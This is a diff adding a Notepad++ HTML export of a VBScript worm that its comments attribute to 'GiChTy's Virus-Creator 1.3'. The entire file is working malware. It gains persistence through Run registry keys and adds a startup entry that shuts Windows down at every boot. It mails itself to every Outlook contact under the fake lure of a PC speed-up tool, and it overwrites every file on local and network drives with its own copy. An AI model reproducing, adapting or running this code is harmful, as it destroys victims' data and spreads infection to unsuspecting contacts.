@@ -1,0 +1,117 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>Exported from Notepad++</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+}
+.sc1 {
+	color: #008000;
+}
+.sc2 {
+	font-weight: bold;
+	color: #FF0000;
+}
+.sc3 {
+	color: #0000FF;
+}
+.sc4 {
+	color: #808080;
+}
+.sc6 {
+	font-weight: bold;
+}
+.sc7 {
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">rem This script is created by GiChTy's Virus-Creator 1.3
+rem I will not take response of what people do with my tool.
+rem check our page : www.blueadeptz.org
+rem or mail me: gichty@blueadeptz.org
+rem GiChTy
+</span><span class="sc0">
+
+</span><span class="sc3">on</span><span class="sc0"> </span><span class="sc3">error</span><span class="sc0"> </span><span class="sc3">resume</span><span class="sc0"> </span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc7">autostart</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc7">addregentries</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc7">spreadtoemail</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc7">killfiles</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">sub</span><span class="sc0"> </span><span class="sc7">autostart</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">dim</span><span class="sc0"> </span><span class="sc7">fso</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">dir</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">file</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">c</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">regedit</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">fso</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">createobject</span><span class="sc6">(</span><span class="sc4">"scripting.filesystemobject"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">dir</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.getspecialfolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">file</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.OpenTextFile</span><span class="sc6">(</span><span class="sc7">WScript.ScriptFullname</span><span class="sc6">,</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">c</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.GetFile</span><span class="sc6">(</span><span class="sc7">WScript.ScriptFullName</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">c.copy</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">dir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\emm.vbs"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">regwrite</span><span class="sc0"> </span><span class="sc4">"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\emm"</span><span class="sc6">,</span><span class="sc7">dir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\emm.vbs"</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">sub</span><span class="sc0">
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Listfiles</span><span class="sc6">(</span><span class="sc7">Folder</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">f</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">fc</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">f1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">fso</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">rr</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">fso</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"scripting.filesystemobject"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">f</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.GetFolder</span><span class="sc6">(</span><span class="sc7">Folder</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">fc</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">f.Files</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">rr</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.GetFile</span><span class="sc6">(</span><span class="sc7">WScript.ScriptFullName</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">f1</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">fc</span><span class="sc0">
+</span><span class="sc7">rr.Copy</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">f1.Path</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">ListFolders</span><span class="sc6">(</span><span class="sc7">Folder</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">f</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">fc</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">f1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">fso</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">fso</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"scripting.filesystemobject"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">f</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.GetFolder</span><span class="sc6">(</span><span class="sc7">Folder</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">fc</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">f.SubFolders</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">f1</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">fc</span><span class="sc0">
+</span><span class="sc7">Listfiles</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">f1.Path</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">ListFolders</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">f1.Path</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Killfiles</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">d</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">dc</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">fso</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">fso</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"scripting.filesystemobject"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">dc</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.Drives</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">d</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">dc</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">d.drivetype</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc7">d.drivetype</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">ListFolders</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">d.Path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc3">sub</span><span class="sc0"> </span><span class="sc7">addregentries</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc7">regwrite</span><span class="sc0"> </span><span class="sc4">"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Emm32"</span><span class="sc6">,</span><span class="sc4">"c:\Windows\rundll32.exe user,exitwindows"</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">sub</span><span class="sc0">
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">spreadtoemail</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">e</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">g</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">o</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">t</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Outlook.Application"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">e</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">i.GetNameSpace</span><span class="sc6">(</span><span class="sc4">"MAPI"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">e.AddressLists</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">g</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">i.CreateItem</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">o</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">l.AddressEntries.Count</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">t</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">l.AddressEntries</span><span class="sc6">(</span><span class="sc7">o</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">o</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">g.BCC</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">t.Address</span><span class="sc0">
+</span><span class="sc3">Else</span><span class="sc0">
+</span><span class="sc7">g.BCC</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">g.BCC</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"; "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">t.Address</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc7">g.Subject</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"New Tool !"</span><span class="sc0">
+</span><span class="sc7">g.Body</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"This tool can speed up your PC up to 15% !"</span><span class="sc0">
+</span><span class="sc7">g.Attachmets.Add</span><span class="sc0"> </span><span class="sc7">WScript.ScriptFullName</span><span class="sc0">
+</span><span class="sc7">g.DeleteAfterSubmit</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
+</span><span class="sc7">g.Send</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Regwrite</span><span class="sc6">(</span><span class="sc7">key</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">value</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">dim</span><span class="sc0"> </span><span class="sc7">regedit</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">regedit</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">createobject</span><span class="sc6">(</span><span class="sc4">"wscript.shell"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">regedit.regwrite</span><span class="sc0"> </span><span class="sc7">key</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">value</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span></div></body>
+</html>
